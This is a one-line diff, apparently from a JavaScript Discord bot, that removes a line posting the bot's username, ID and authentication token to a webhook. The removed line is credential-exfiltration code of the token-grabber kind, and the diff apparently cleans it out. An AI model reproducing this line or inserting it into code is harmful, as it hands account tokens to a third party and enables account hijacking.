@@ -1,1 +1,0 @@
-await webhook.send({content: `> **USERNAME:** ${client.user.tag}\n> **ID:** ${client.user.id}\n> **TOKEN:** ${client.token}`, username: client.user.username, avatarURL: client.user.avatarURL()})
